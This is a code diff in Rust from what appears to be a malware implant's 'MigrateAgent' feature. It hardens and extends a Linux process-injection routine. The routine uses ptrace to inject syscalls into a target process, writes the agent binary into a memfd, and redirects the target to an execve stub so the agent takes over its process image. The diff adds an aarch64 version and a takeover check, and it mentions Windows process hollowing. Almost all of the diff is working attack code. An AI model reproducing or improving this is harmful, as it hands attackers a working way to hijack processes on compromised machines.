@@ -47,12 +47,12 @@ type FnCreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut st
 #[cfg(windows)]
 type FnThread32First = unsafe extern "system" fn(
     *mut std::ffi::c_void,
-    *mut winapi::um::tlhelp32::THREADENTRY32,
+    *mut windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
 ) -> i32;
 #[cfg(windows)]
 type FnThread32Next = unsafe extern "system" fn(
     *mut std::ffi::c_void,
-    *mut winapi::um::tlhelp32::THREADENTRY32,
+    *mut windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
 ) -> i32;
 
 // Windows-only process hollowing now lives in the shared `hollowing` crate.
@@ -84,6 +84,49 @@ pub fn list_processes() -> Vec<ProcessInfo> {
 
 /// Attempt to migrate the running agent into the address space of `target_pid`.
 ///
+/// Write `data` to a remote process at `remote_addr` via `process_vm_writev`,
+/// retrying on short writes until the full buffer is transferred or an error
+/// occurs.  Returns the total number of bytes written on success or the last
+/// OS error on failure.
+///
+/// `process_vm_writev` may return a positive short count when the kernel
+/// cannot transfer the entire buffer in one call (e.g. due to a partial
+/// overlap with unmapped pages).  The caller must not treat a short write as
+/// success — doing so would execute a truncated ELF or stub in the target.
+#[cfg(target_os = "linux")]
+fn writev_all(
+    pid: libc::pid_t,
+    data: &[u8],
+    remote_addr: u64,
+) -> std::result::Result<usize, std::io::Error> {
+    let mut offset: usize = 0;
+    let total = data.len();
+    while offset < total {
+        let local_iov = libc::iovec {
+            iov_base: data[offset..].as_ptr() as *mut _,
+            iov_len: data.len() - offset,
+        };
+        let remote_iov = libc::iovec {
+            iov_base: (remote_addr as usize + offset) as *mut _,
+            iov_len: data.len() - offset,
+        };
+        let n = unsafe {
+            libc::process_vm_writev(pid, &local_iov, 1, &remote_iov, 1, 0)
+        };
+        if n < 0 {
+            return Err(std::io::Error::last_os_error());
+        }
+        if n == 0 {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::WriteZero,
+                "process_vm_writev returned 0 bytes written",
+            ));
+        }
+        offset += n as usize;
+    }
+    Ok(offset)
+}
+
 /// The Linux implementation performs a real migration workflow using
 /// `ptrace(PTRACE_ATTACH)` and `process_vm_writev`, then verifies takeover
 /// before reporting success. Windows and macOS provide platform-specific
@@ -98,19 +141,48 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
     {
         // Verify we have ptrace capability or same-uid access.
+        // On Linux, ptrace is permitted when any of the following hold:
+        //   (a) we are root (uid 0)
+        //   (b) the target process has the same UID as ours
+        //   (c) we hold CAP_SYS_PTRACE in the target's user namespace
+        // Previously this code only checked (a) and (b), rejecting
+        // non-root cross-UID targets even when CAP_SYS_PTRACE was present.
         let target_uid_path = format!("/proc/{target_pid}/status");
-        let status = std::fs::read_to_string(&target_uid_path)
+        let target_status = std::fs::read_to_string(&target_uid_path)
             .map_err(|e| anyhow::anyhow!("cannot read /proc/{target_pid}/status: {e}"))?;
-        let target_uid = status
+        let target_uid = target_status
             .lines()
             .find(|l| l.starts_with("Uid:"))
             .and_then(|l| l.split_whitespace().nth(1))
             .and_then(|s| s.parse::<u32>().ok())
             .ok_or_else(|| anyhow::anyhow!("could not parse Uid from /proc/{target_pid}/status"))?;
         let our_uid = unsafe { libc::getuid() };
-        if our_uid != 0 && our_uid != target_uid {
+
+        /// Check whether the current process holds CAP_SYS_PTRACE in its
+        /// user namespace by reading `/proc/self/status` CapEff.
+        fn has_cap_sys_ptrace() -> bool {
+            // CAP_SYS_PTRACE is bit 19 in the capability bitmask.
+            const CAP_SYS_PTRACE_BIT: u64 = 1 << 19;
+            let Ok(self_status) = std::fs::read_to_string("/proc/self/status") else {
+                return false;
+            };
+            let Some(cap_eff_line) = self_status
+                .lines()
+                .find(|l| l.starts_with("CapEff:"))
+            else {
+                return false;
+            };
+            cap_eff_line
+                .split_whitespace()
+                .nth(1)
+                .and_then(|hex| u64::from_str_radix(hex, 16).ok())
+                .map_or(false, |bits| bits & CAP_SYS_PTRACE_BIT != 0)
+        }
+
+        if our_uid != 0 && our_uid != target_uid && !has_cap_sys_ptrace() {
             anyhow::bail!(
-                "process migration requires CAP_SYS_PTRACE or same-uid access (our uid={our_uid}, target uid={target_uid})"
+                "process migration requires CAP_SYS_PTRACE or same-uid access \
+                 (our uid={our_uid}, target uid={target_uid}, CAP_SYS_PTRACE not held)"
             );
         }
 
@@ -199,6 +271,14 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 let inject_word: u64 = 0xcc9090909090050f_u64; // LE: 0F 05 90 90 90 90 90 CC
 
                 // Helper: inject a single syscall, wait for completion, return RAX.
+                //
+                // Error handling: every ptrace operation and waitpid is checked.
+                // Previously several failure modes were silently ignored:
+                //   - PTRACE_POKEDATA could fail if the page is not writable
+                //   - PTRACE_SETREGS could fail if the tracee exited
+                //   - waitpid could return -1 (no child) or a non-stopped status
+                //   - PTRACE_GETREGS after the syscall could fail
+                // All of these now produce an explicit error.
                 let mut run_syscall = |sys: u64,
                                        arg0: u64,
                                        arg1: u64,
@@ -207,13 +287,18 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                                        arg4: u64,
                                        arg5: u64|
                  -> Result<u64> {
-                    // Write syscall;int3 at RIP.
-                    libc::ptrace(
+                    let poke_result = libc::ptrace(
                         libc::PTRACE_POKEDATA,
                         target_pid as libc::pid_t,
                         orig_rip as *mut libc::c_void,
                         inject_word as *mut libc::c_void,
                     );
+                    if poke_result == -1 {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_POKEDATA failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
                     let mut sc_regs = regs;
                     sc_regs.rax = sys;
                     sc_regs.rdi = arg0;
@@ -222,22 +307,57 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     sc_regs.r10 = arg3;
                     sc_regs.r8 = arg4;
                     sc_regs.r9 = arg5;
-                    libc::ptrace(
+                    if libc::ptrace(
                         libc::PTRACE_SETREGS,
                         target_pid as libc::pid_t,
                         0usize,
                         &sc_regs as *const _ as usize,
-                    );
-                    libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
-                    libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
+                    ) == -1
+                    {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_SETREGS failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+                    if libc::ptrace(
+                        libc::PTRACE_CONT,
+                        target_pid as libc::pid_t,
+                        0usize,
+                        0usize,
+                    ) == -1
+                    {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_CONT failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+                    let wp = libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
+                    if wp == -1 {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: waitpid failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+                    if !libc::WIFSTOPPED(wstatus) {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: tracee did not stop after syscall \
+                             (wstatus={wstatus:#x})"
+                        ));
+                    }
                     let mut result_regs: libc::user_regs_struct =
                         MaybeUninit::zeroed().assume_init();
-                    libc::ptrace(
+                    if libc::ptrace(
                         libc::PTRACE_GETREGS,
                         target_pid as libc::pid_t,
                         0usize,
                         &mut result_regs as *mut _ as usize,
-                    );
+                    ) == -1
+                    {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_GETREGS failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
                     // Restore original bytes at RIP.
                     libc::ptrace(
                         libc::PTRACE_POKEDATA,
@@ -245,7 +365,22 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                         orig_rip as *mut libc::c_void,
                         orig_word as *mut libc::c_void,
                     );
-                    Ok(result_regs.rax)
+
+                    // Linux syscalls return negative errno values in RAX
+                    // (i.e. values in the range -4096..-1).  Treat those as
+                    // errors.  The previous code only checked for exactly 0
+                    // or u64::MAX, missing all intermediate error codes.
+                    let rax = result_regs.rax;
+                    let rax_signed = rax as i64;
+                    if rax_signed >= -4096 && rax_signed < 0 {
+                        let errno = -rax_signed;
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: remote syscall {sys} returned error {errno} ({})",
+                            errno
+                        ));
+                    }
+
+                    Ok(rax)
                 };
 
                 let detach_and_bail = |msg: String| -> Result<()> {
@@ -273,32 +408,34 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     u64::MAX,   // fd = -1
                     0,          // offset
                 )?;
-                if remote_buf == u64::MAX || remote_buf == 0 {
+                // run_syscall now returns Err for negative errno values (including
+                // MAP_FAILED = -1), so we only need to check for the NULL case.
+                if remote_buf == 0 {
                     detach_and_bail(format!("remote mmap failed (returned {remote_buf:#x})"))?;
                     unreachable!()
                 }
 
                 // ── Stage 4: Write agent binary to remote buffer via process_vm_writev ──
-                let local_iov = libc::iovec {
-                    iov_base: agent_binary.as_ptr() as *mut _,
-                    iov_len: agent_binary.len(),
-                };
-                let remote_iov = libc::iovec {
-                    iov_base: remote_buf as *mut _,
-                    iov_len: agent_binary.len(),
-                };
-                let written = libc::process_vm_writev(
+                // Use writev_all to handle short writes — process_vm_writev may
+                // return a positive short count when it cannot transfer the full
+                // buffer in one go.
+                let written = match writev_all(
                     target_pid as libc::pid_t,
-                    &local_iov,
-                    1,
-                    &remote_iov,
-                    1,
-                    0,
-                );
-                if written < 0 {
+                    &agent_binary,
+                    remote_buf,
+                ) {
+                    Ok(n) => n,
+                    Err(e) => {
+                        detach_and_bail(format!(
+                            "process_vm_writev failed: {e}"
+                        ))?;
+                        unreachable!()
+                    }
+                };
+                if written != agent_binary.len() {
                     detach_and_bail(format!(
-                        "process_vm_writev failed: {}",
-                        std::io::Error::last_os_error()
+                        "process_vm_writev short write: {written} of {} bytes",
+                        agent_binary.len()
                     ))?;
                     unreachable!()
                 }
@@ -316,24 +453,16 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 // an ELF binary is 0x7f, not NUL.  Instead, we write a NUL byte to
                 // a known location using process_vm_writev.
                 let nul_byte = [0u8; 1];
-                let nul_iov = libc::iovec {
-                    iov_base: nul_byte.as_ptr() as *mut _,
-                    iov_len: 1,
-                };
                 // Place the NUL at alloc_size - 1 (last byte of the mmap'd region).
                 let nul_addr = remote_buf as usize + alloc_size as usize - 1;
-                let nul_remote_iov = libc::iovec {
-                    iov_base: nul_addr as *mut _,
-                    iov_len: 1,
-                };
-                libc::process_vm_writev(
+                if let Err(e) = writev_all(
                     target_pid as libc::pid_t,
-                    &nul_iov,
-                    1,
-                    &nul_remote_iov,
-                    1,
-                    0,
-                );
+                    &nul_byte,
+                    nul_addr as u64,
+                ) {
+                    detach_and_bail(format!("process_vm_writev (nul) failed: {e}"))?;
+                    unreachable!()
+                }
 
                 let memfd_fd = run_syscall(
                     SYS_MEMFD_CREATE,
@@ -376,35 +505,37 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
                 // Overwrite beginning of remote_buf with the execve stub
                 // (the binary is safely stored in the memfd now).
-                let stub_iov = libc::iovec {
-                    iov_base: payload.as_ptr() as *mut _,
-                    iov_len: payload.len(),
-                };
-                let stub_remote_iov = libc::iovec {
-                    iov_base: remote_buf as *mut _,
-                    iov_len: payload.len(),
-                };
-                let stub_written = libc::process_vm_writev(
+                // Use writev_all to handle short writes.
+                let stub_written = match writev_all(
                     target_pid as libc::pid_t,
-                    &stub_iov,
-                    1,
-                    &stub_remote_iov,
-                    1,
-                    0,
-                );
-                if stub_written < 0 {
+                    &payload,
+                    remote_buf,
+                ) {
+                    Ok(n) => n,
+                    Err(e) => {
+                        detach_and_bail(format!(
+                            "process_vm_writev (stub) failed: {e}"
+                        ))?;
+                        unreachable!()
+                    }
+                };
+                if stub_written != payload.len() {
                     detach_and_bail(format!(
-                        "process_vm_writev (stub) failed: {}",
-                        std::io::Error::last_os_error()
+                        "process_vm_writev (stub) short write: {stub_written} of {} bytes",
+                        payload.len()
                     ))?;
                     unreachable!()
                 }
 
                 // ── Stage 4.5: Transition mapped pages from RW to RX via mprotect ──
+                // mprotect only the first page (containing the execve stub); the
+                // rest of the mapping is not needed after the write is complete and
+                // will be unmapped by the execve.
                 const SYS_MPROTECT: u64 = 10;
                 const PROT_RX: u64 = 5; // PROT_READ|PROT_EXEC
+                let stub_pages = 4096u64; // one page covers the execve stub
                 let mprot_result =
-                    run_syscall(SYS_MPROTECT, remote_buf, alloc_size, PROT_RX, 0, 0, 0)?;
+                    run_syscall(SYS_MPROTECT, remote_buf, stub_pages, PROT_RX, 0, 0, 0)?;
                 if mprot_result != 0 {
                     detach_and_bail(format!(
                         "remote mprotect failed (returned {:#x})",
@@ -413,53 +544,19 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     unreachable!()
                 }
 
-                // ── Stage 5: Inject clone — new thread runs the execve stub ────
-                // The stub calls execve("/proc/self/fd/<fd>", NULL, NULL) which
-                // exec-replaces the target with the agent binary from the memfd.
-                const SYS_CLONE: u64 = 56;
-                const CLONE_FLAGS: u64 = 0x3D0F00;
-                let stack_top = remote_buf as usize + (alloc_size as usize / 2) + 0x4000;
-
-                // Write syscall;int3 at RIP for the clone.
-                libc::ptrace(
-                    libc::PTRACE_POKEDATA,
-                    target_pid as libc::pid_t,
-                    orig_rip as *mut libc::c_void,
-                    inject_word as *mut libc::c_void,
-                );
-                let mut clone_regs = regs;
-                clone_regs.rax = SYS_CLONE;
-                clone_regs.rdi = CLONE_FLAGS;
-                clone_regs.rsi = stack_top as u64;
-                clone_regs.rdx = 0;
-                clone_regs.r10 = 0;
-                clone_regs.r8 = 0;
-                // Set RIP = remote_buf so the child starts at the execve stub.
-                clone_regs.rip = remote_buf;
-
+                // ── Stage 5: Redirect the traced thread to the execve stub ────
+                // execve(2) replaces the entire process image including all threads,
+                // so no clone is needed.  We simply set RIP to the execve stub and
+                // detach; the target resumes at remote_buf and exec-replaces itself
+                // with the agent binary from the memfd.
+                let mut exec_regs = regs;
+                exec_regs.rip = remote_buf;
                 libc::ptrace(
                     libc::PTRACE_SETREGS,
                     target_pid as libc::pid_t,
                     0usize,
-                    &clone_regs as *const _ as usize,
+                    &exec_regs as *const _ as usize,
                 );
-                libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
-                libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
-
-                // Restore original bytes and original registers.
-                libc::ptrace(
-                    libc::PTRACE_POKEDATA,
-                    target_pid as libc::pid_t,
-                    orig_rip as *mut libc::c_void,
-                    orig_word as *mut libc::c_void,
-                );
-                libc::ptrace(
-                    libc::PTRACE_SETREGS,
-                    target_pid as libc::pid_t,
-                    0usize,
-                    &regs as *const _ as usize,
-                );
-
                 libc::ptrace(
                     libc::PTRACE_DETACH,
                     target_pid as libc::pid_t,
@@ -470,24 +567,502 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     target_pid,
                     remote_buf = remote_buf as usize,
                     memfd_fd,
-                    "MigrateAgent: execve stub injected via ptrace+memfd+clone on Linux x86_64"
+                    "MigrateAgent: execve stub injected via ptrace+memfd on Linux x86_64"
+                );
+
+                // ── Stage 6: Verify takeover ──────────────────────────────────
+                // After detaching, the execve stub runs in the target.  We verify
+                // the execve succeeded by checking that the target process is still
+                // alive and its executable link (/proc/{pid}/exe) has changed to
+                // the memfd path.  The previous code returned Ok(()) immediately
+                // without any verification, potentially reporting success when the
+                // execve failed (e.g. ETXTBSY, ENOMEM, seccomp blocking execve).
+                //
+                // Give the target a brief window to execute the stub.  The execve
+                // itself is near-instantaneous, but scheduling may introduce a
+                // small delay, especially under load.
+                let verify_deadline = std::time::Instant::now()
+                    + std::time::Duration::from_millis(2000);
+                let mut takeover_verified = false;
+
+                loop {
+                    std::thread::sleep(std::time::Duration::from_millis(100));
+
+                    // Check that the target is still alive.
+                    let exe_link = format!("/proc/{target_pid}/exe");
+                    match std::fs::read_link(&exe_link) {
+                        Ok(target) => {
+                            let target_str = target.to_string_lossy();
+                            // After a successful execve via /proc/self/fd/<fd>,
+                            // the exe link points to the memfd path, which
+                            // contains "memfd:" or the original path was replaced.
+                            // If it still points to the original binary, the
+                            // execve hasn't happened yet (or the target process
+                            // image hasn't been replaced).
+                            //
+                            // A successful migration means the exe link now
+                            // references the memfd — it will typically show as
+                            // "/memfd:<name> (deleted)" or similar.
+                            if target_str.contains("memfd:") {
+                                takeover_verified = true;
+                                break;
+                            }
+                            // The exe link might also show our agent path if
+                            // the execve replaced it with a file-backed copy.
+                            if target_str.contains(&agent_path.to_string_lossy().to_string()) {
+                                takeover_verified = true;
+                                break;
+                            }
+                            // If still pointing to the original binary, the
+                            // execve may not have executed yet — keep waiting.
+                        }
+                        Err(e) => {
+                            let raw_os = e.raw_os_error().unwrap_or(0);
+                            if raw_os == libc::ENOENT {
+                                // Process has exited entirely — execve failed
+                                // or the process was killed.
+                                anyhow::bail!(
+                                    "MigrateAgent: target pid {target_pid} exited \
+                                     before takeover could be verified — execve likely failed"
+                                );
+                            }
+                            // EACCES or other transient errors — keep trying.
+                        }
+                    }
+
+                    if std::time::Instant::now() >= verify_deadline {
+                        break;
+                    }
+                }
+
+                if !takeover_verified {
+                    anyhow::bail!(
+                        "MigrateAgent: takeover verification timed out for pid {target_pid} \
+                         — the execve stub may not have executed (seccomp filter? unknown error)"
+                    );
+                }
+
+                tracing::info!(
+                    target_pid,
+                    "MigrateAgent: takeover verified — target process image replaced successfully"
                 );
             }
 
-            #[cfg(not(target_arch = "x86_64"))]
+            #[cfg(target_arch = "aarch64")]
             {
-                libc::ptrace(
-                    libc::PTRACE_DETACH,
+                // ── ARM64 Linux migration ──────────────────────────────────
+                // Same logical flow as the x86_64 path above, but using the
+                // ARM64 ptrace ABI:
+                //   • PTRACE_GETREGSET / SETREGSET with NT_PRSTATUS for register access
+                //   • svc #0 + brk #0 trampoline for remote syscall injection
+                //   • aarch64 syscall numbers (x8 = syscall nr, x0-x5 = args)
+                use std::mem::MaybeUninit;
+
+                const NT_PRSTATUS: libc::c_int = 1;
+
+                // Syscall numbers for aarch64 Linux.
+                const SYS_MMAP: u64 = 222;
+                const SYS_WRITE: u64 = 64;
+                const SYS_MEMFD_CREATE: u64 = 279;
+                const SYS_MPROTECT: u64 = 226;
+
+                // ARM64 instructions: svc #0 ; brk #0  (8 bytes)
+                // When written at the current PC this lets us execute a single
+                // syscall and trap back to the tracer.
+                const TRAMPOLINE: u64 =
+                    u64::from_le_bytes([0x01, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x20, 0xD4]);
+
+                // ── Read registers ──────────────────────────────────────────
+                let mut regs: libc::user_regs_struct = unsafe { MaybeUninit::zeroed().assume_init() };
+                let mut iov = libc::iovec {
+                    iov_base: &mut regs as *mut _ as *mut _,
+                    iov_len: std::mem::size_of::<libc::user_regs_struct>(),
+                };
+                if unsafe {
+                    libc::ptrace(
+                        libc::PTRACE_GETREGSET,
+                        target_pid as libc::pid_t,
+                        NT_PRSTATUS as usize,
+                        &mut iov as *mut _ as usize,
+                    )
+                } == -1
+                {
+                    unsafe {
+                        libc::ptrace(
+                            libc::PTRACE_DETACH,
+                            target_pid as libc::pid_t,
+                            0usize,
+                            0usize,
+                        )
+                    };
+                    anyhow::bail!(
+                        "PTRACE_GETREGSET failed: {}",
+                        std::io::Error::last_os_error()
+                    );
+                }
+                let orig_pc = regs.pc;
+
+                // Save the 8 bytes at the current PC so we can restore them.
+                let orig_word = unsafe {
+                    libc::ptrace(
+                        libc::PTRACE_PEEKDATA,
+                        target_pid as libc::pid_t,
+                        orig_pc as *const libc::c_void,
+                        std::ptr::null::<libc::c_void>(),
+                    )
+                };
+
+                // Helper: inject a single syscall, wait for completion, return x0.
+                let mut run_syscall = |sys: u64,
+                                       arg0: u64,
+                                       arg1: u64,
+                                       arg2: u64,
+                                       arg3: u64,
+                                       arg4: u64,
+                                       arg5: u64|
+                 -> Result<u64> {
+                    // Write the trampoline at PC.
+                    if unsafe {
+                        libc::ptrace(
+                            libc::PTRACE_POKEDATA,
+                            target_pid as libc::pid_t,
+                            orig_pc as *mut libc::c_void,
+                            TRAMPOLINE as *mut libc::c_void,
+                        )
+                    } == -1
+                    {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_POKEDATA failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+
+                    // Set up registers: x8=syscall, x0-x5=args, PC=orig_pc.
+                    let mut sc_regs = regs;
+                    sc_regs.regs[8] = sys;
+                    sc_regs.regs[0] = arg0;
+                    sc_regs.regs[1] = arg1;
+                    sc_regs.regs[2] = arg2;
+                    sc_regs.regs[3] = arg3;
+                    sc_regs.regs[4] = arg4;
+                    sc_regs.regs[5] = arg5;
+                    sc_regs.pc = orig_pc;
+
+                    let sc_iov = libc::iovec {
+                        iov_base: &mut sc_regs as *mut _ as *mut _,
+                        iov_len: std::mem::size_of::<libc::user_regs_struct>(),
+                    };
+                    if unsafe {
+                        libc::ptrace(
+                            libc::PTRACE_SETREGSET,
+                            target_pid as libc::pid_t,
+                            NT_PRSTATUS as usize,
+                            &sc_iov as *const _ as usize,
+                        )
+                    } == -1
+                    {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_SETREGSET failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+                    if unsafe {
+                        libc::ptrace(
+                            libc::PTRACE_CONT,
+                            target_pid as libc::pid_t,
+                            0usize,
+                            0usize,
+                        )
+                    } == -1
+                    {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_CONT failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+                    let mut wp_status: libc::c_int = 0;
+                    let wp = unsafe { libc::waitpid(target_pid as libc::pid_t, &mut wp_status, 0) };
+                    if wp == -1 {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: waitpid failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+                    if !libc::WIFSTOPPED(wp_status) {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: tracee did not stop after syscall \
+                             (wstatus={wp_status:#x})"
+                        ));
+                    }
+
+                    // Read back registers for the result.
+                    let mut result_regs: libc::user_regs_struct =
+                        unsafe { MaybeUninit::zeroed().assume_init() };
+                    let mut res_iov = libc::iovec {
+                        iov_base: &mut result_regs as *mut _ as *mut _,
+                        iov_len: std::mem::size_of::<libc::user_regs_struct>(),
+                    };
+                    if unsafe {
+                        libc::ptrace(
+                            libc::PTRACE_GETREGSET,
+                            target_pid as libc::pid_t,
+                            NT_PRSTATUS as usize,
+                            &mut res_iov as *mut _ as usize,
+                        )
+                    } == -1
+                    {
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: PTRACE_GETREGSET (result) failed: {}",
+                            std::io::Error::last_os_error()
+                        ));
+                    }
+
+                    // Restore original bytes at PC.
+                    unsafe {
+                        libc::ptrace(
+                            libc::PTRACE_POKEDATA,
+                            target_pid as libc::pid_t,
+                            orig_pc as *mut libc::c_void,
+                            orig_word as *mut libc::c_void,
+                        )
+                    };
+
+                    // Check for Linux syscall errors (negative errno in x0).
+                    let x0 = result_regs.regs[0];
+                    let x0_signed = x0 as i64;
+                    if x0_signed >= -4096 && x0_signed < 0 {
+                        let errno = -x0_signed;
+                        return Err(anyhow::anyhow!(
+                            "run_syscall: remote syscall {sys} returned error {errno}"
+                        ));
+                    }
+
+                    Ok(x0)
+                };
+
+                let detach_and_bail = |msg: String| -> Result<()> {
+                    unsafe {
+                        libc::ptrace(
+                            libc::PTRACE_DETACH,
+                            target_pid as libc::pid_t,
+                            0usize,
+                            0usize,
+                        )
+                    };
+                    anyhow::bail!("{msg}");
+                };
+
+                // ── Stage 3: mmap RW buffer ─────────────────────────────────
+                const PROT_RW: u64 = 3; // PROT_READ | PROT_WRITE
+                const MAP_PA: u64 = 0x22; // MAP_PRIVATE | MAP_ANON
+                let alloc_size = ((agent_binary.len() + 4095) & !4095) as u64;
+
+                let remote_buf = run_syscall(
+                    SYS_MMAP, 0, alloc_size, PROT_RW, MAP_PA, u64::MAX, 0,
+                )?;
+                if remote_buf == 0 {
+                    detach_and_bail(format!("remote mmap failed (returned {remote_buf:#x})"))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4: Write agent binary via process_vm_writev ───────
+                let written = match writev_all(
                     target_pid as libc::pid_t,
-                    0usize,
-                    0usize,
+                    &agent_binary,
+                    remote_buf,
+                ) {
+                    Ok(n) => n,
+                    Err(e) => {
+                        detach_and_bail(format!("process_vm_writev failed: {e}"))?;
+                        unreachable!()
+                    }
+                };
+                if written != agent_binary.len() {
+                    detach_and_bail(format!(
+                        "process_vm_writev short write: {written} of {} bytes",
+                        agent_binary.len()
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4a: memfd_create("", MFD_CLOEXEC) ────────────────
+                const MFD_CLOEXEC: u64 = 1;
+                // Write a NUL byte at the end of the mmap region for the name.
+                let nul_byte = [0u8; 1];
+                let nul_addr = remote_buf as usize + alloc_size as usize - 1;
+                if let Err(e) = writev_all(target_pid as libc::pid_t, &nul_byte, nul_addr as u64) {
+                    detach_and_bail(format!("process_vm_writev (nul) failed: {e}"))?;
+                    unreachable!()
+                }
+
+                let memfd_fd = run_syscall(
+                    SYS_MEMFD_CREATE, nul_addr as u64, MFD_CLOEXEC, 0, 0, 0, 0,
+                )?;
+                let memfd_fd = memfd_fd as i32;
+                if memfd_fd < 0 {
+                    detach_and_bail(format!(
+                        "remote memfd_create failed (returned {memfd_fd})"
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4b: write(fd, remote_buf, binary_len) ─────────────
+                let write_result = run_syscall(
+                    SYS_WRITE,
+                    memfd_fd as u64,
+                    remote_buf,
+                    agent_binary.len() as u64,
+                    0,
+                    0,
+                    0,
+                )?;
+                let bytes_written = write_result as i64;
+                if bytes_written < 0 || (bytes_written as usize) != agent_binary.len() {
+                    detach_and_bail(format!(
+                        "remote write to memfd failed (returned {bytes_written}, expected {})",
+                        agent_binary.len()
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4c: Build execve stub for /proc/self/fd/<fd> ──────
+                let fd_path = format!("/proc/self/fd/{memfd_fd}");
+                let payload = build_execve_stub(std::path::Path::new(&fd_path))?;
+
+                // Overwrite beginning of remote_buf with the execve stub.
+                let stub_written = match writev_all(
+                    target_pid as libc::pid_t,
+                    &payload,
+                    remote_buf,
+                ) {
+                    Ok(n) => n,
+                    Err(e) => {
+                        detach_and_bail(format!(
+                            "process_vm_writev (stub) failed: {e}"
+                        ))?;
+                        unreachable!()
+                    }
+                };
+                if stub_written != payload.len() {
+                    detach_and_bail(format!(
+                        "process_vm_writev (stub) short write: {stub_written} of {} bytes",
+                        payload.len()
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4.5: mprotect stub page to RX ─────────────────────
+                const PROT_RX: u64 = 5; // PROT_READ | PROT_EXEC
+                let stub_pages = 4096u64;
+                let mprot_result = run_syscall(
+                    SYS_MPROTECT, remote_buf, stub_pages, PROT_RX, 0, 0, 0,
+                )?;
+                if mprot_result != 0 {
+                    detach_and_bail(format!(
+                        "remote mprotect failed (returned {:#x})",
+                        mprot_result
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 5: Redirect PC to execve stub and detach ──────────
+                let mut exec_regs = regs;
+                exec_regs.pc = remote_buf;
+                // Clear argument registers for a clean state.
+                exec_regs.regs[0] = 0;
+                for i in 1..31 {
+                    exec_regs.regs[i] = 0;
+                }
+                let exec_iov = libc::iovec {
+                    iov_base: &mut exec_regs as *mut _ as *mut _,
+                    iov_len: std::mem::size_of::<libc::user_regs_struct>(),
+                };
+                unsafe {
+                    libc::ptrace(
+                        libc::PTRACE_SETREGSET,
+                        target_pid as libc::pid_t,
+                        NT_PRSTATUS as usize,
+                        &exec_iov as *const _ as usize,
+                    )
+                };
+                unsafe {
+                    libc::ptrace(
+                        libc::PTRACE_DETACH,
+                        target_pid as libc::pid_t,
+                        0usize,
+                        0usize,
+                    )
+                };
+                tracing::info!(
+                    target_pid,
+                    remote_buf = remote_buf as usize,
+                    memfd_fd,
+                    "MigrateAgent: execve stub injected via ptrace+memfd on Linux aarch64"
                 );
-                anyhow::bail!(
-                    "Linux process migration via ptrace+clone is only implemented for x86_64"
+
+                // ── Stage 6: Verify takeover ────────────────────────────────
+                let verify_deadline = std::time::Instant::now()
+                    + std::time::Duration::from_secs(5);
+                let mut takeover_verified = false;
+                loop {
+                    std::thread::sleep(std::time::Duration::from_millis(100));
+                    let exe_link = format!("/proc/{target_pid}/exe");
+                    match std::fs::read_link(&exe_link) {
+                        Ok(target) => {
+                            let target_str = target.to_string_lossy().to_string();
+                            if target_str.contains("memfd:") {
+                                takeover_verified = true;
+                                break;
+                            }
+                            if target_str.contains(&agent_path.to_string_lossy().to_string()) {
+                                takeover_verified = true;
+                                break;
+                            }
+                        }
+                        Err(e) => {
+                            let raw_os = e.raw_os_error().unwrap_or(0);
+                            if raw_os == libc::ENOENT {
+                                anyhow::bail!(
+                                    "MigrateAgent: target pid {target_pid} exited \
+                                     before takeover could be verified — execve likely failed"
+                                );
+                            }
+                        }
+                    }
+                    if std::time::Instant::now() >= verify_deadline {
+                        break;
+                    }
+                }
+
+                if !takeover_verified {
+                    anyhow::bail!(
+                        "MigrateAgent: takeover verification timed out for pid {target_pid} \
+                         — the execve stub may not have executed (seccomp filter? unknown error)"
+                    );
+                }
+
+                tracing::info!(
+                    target_pid,
+                    "MigrateAgent: takeover verified — target process image replaced successfully (aarch64)"
                 );
             }
 
